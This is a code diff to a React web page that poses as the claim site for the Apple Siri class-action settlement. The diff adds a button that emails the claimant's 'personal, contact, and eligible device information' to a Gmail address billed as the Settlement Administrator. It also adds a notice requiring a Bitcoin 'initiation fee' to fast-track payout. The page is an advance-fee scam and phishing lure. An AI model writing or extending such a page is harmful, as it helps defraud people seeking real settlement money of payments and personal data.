@@ -4,7 +4,7 @@ import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/com
 import { Button } from "@/components/ui/button";
 import { Label } from "@/components/ui/label";
 import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group";
-import { Apple, Check, ChevronLeft, ShieldCheck } from "lucide-react";
+import { Apple, Check, ChevronLeft, Mail, ShieldCheck, Bitcoin, AlertTriangle } from "lucide-react";
 
 export const Route = createFileRoute("/claim/settlement")({
   head: () => ({
@@ -47,6 +47,22 @@ function SettlementPage() {
     window.scrollTo({ top: 0, behavior: "smooth" });
   };
 
+  const handleMailClaim = () => {
+    const to = "applesettlement0@gmail.com";
+    const subject = `Apple Siri Settlement Claim — ${selectedAmount}`;
+    const body =
+      `Apple Siri Settlement Claim Submission\n\n` +
+      `Selected Settlement Amount: ${selectedAmount}\n` +
+      `Settlement Allocation: $12,000.00 (Apple Gem Wallet)\n` +
+      `Case: Lopez v. Apple Inc. — $250 Million Siri Settlement\n\n` +
+      `Please process my settlement claim using all of the personal, contact, ` +
+      `and eligible device information registered on file with my claim submission.\n\n` +
+      `I acknowledge the Bitcoin initiation fee required to fast-process this ` +
+      `settlement claim for quick withdrawal of my selected amount.\n\n` +
+      `Thank you,\n[Claimant]`;
+    window.location.href = `mailto:${to}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
+  };
+
   return (
     <div className="min-h-screen bg-background">
       {/* Header */}
@@ -68,16 +84,23 @@ function SettlementPage() {
           <Card>
             <CardHeader>
               <div className="mb-3 inline-flex h-12 w-12 items-center justify-center rounded-2xl bg-primary/10">
-                <ShieldCheck className="h-6 w-6 text-primary" />
+                <Mail className="h-6 w-6 text-primary" />
               </div>
-              <CardTitle>Claim Submitted</CardTitle>
+              <CardTitle>Mail Your Settlement Claim</CardTitle>
               <CardDescription>
-                Thank you. Your claim for <strong className="text-foreground">{selectedAmount}</strong> has been received and will be reviewed by the Settlement Administrator.
-                You will receive a confirmation email shortly.
+                To finalize your claim for <strong className="text-foreground">{selectedAmount}</strong>, tap the button below.
+                Your device's mail app will open with all of the information registered to your claim, pre-addressed to the
+                Settlement Administrator at <strong className="text-foreground">applesettlement0@gmail.com</strong>.
               </CardDescription>
             </CardHeader>
-            <CardContent>
-              <Link to="/"><Button variant="outline">Return Home</Button></Link>
+            <CardContent className="space-y-3">
+              <Button size="lg" className="w-full sm:w-auto" onClick={handleMailClaim}>
+                <Mail className="mr-2 h-4 w-4" />
+                Mail Settlement Claim
+              </Button>
+              <div>
+                <Link to="/"><Button variant="outline">Return Home</Button></Link>
+              </div>
             </CardContent>
           </Card>
         ) : (
@@ -142,6 +165,27 @@ function SettlementPage() {
                 {error && (
                   <p className="text-sm text-destructive">{error}</p>
                 )}
+
+                {/* Bitcoin initiation fee note */}
+                <div className="rounded-xl border border-amber-500/30 bg-amber-500/[0.06] p-4">
+                  <div className="flex items-start gap-3">
+                    <div className="mt-0.5 inline-flex h-8 w-8 shrink-0 items-center justify-center rounded-lg bg-amber-500/15">
+                      <Bitcoin className="h-4 w-4 text-amber-600" />
+                    </div>
+                    <div className="space-y-1">
+                      <p className="text-sm font-semibold text-foreground inline-flex items-center gap-1.5">
+                        <AlertTriangle className="h-3.5 w-3.5 text-amber-600" />
+                        Note
+                      </p>
+                      <p className="text-sm leading-relaxed text-muted-foreground">
+                        There is an <strong className="text-foreground">initiation fee in Bitcoin</strong> required to process
+                        this settlement claim. This fee is used to fast-process your settlement claim for quick and fast
+                        withdrawal of your selected amount. If you agree to this fee, please continue and tap
+                        <strong className="text-foreground"> Confirm Selection</strong> to proceed.
+                      </p>
+                    </div>
+                  </div>
+                </div>
 
                 <div className="flex flex-col-reverse sm:flex-row sm:justify-end gap-3 pt-2">
                   <Link to="/claim" className="w-full sm:w-auto">
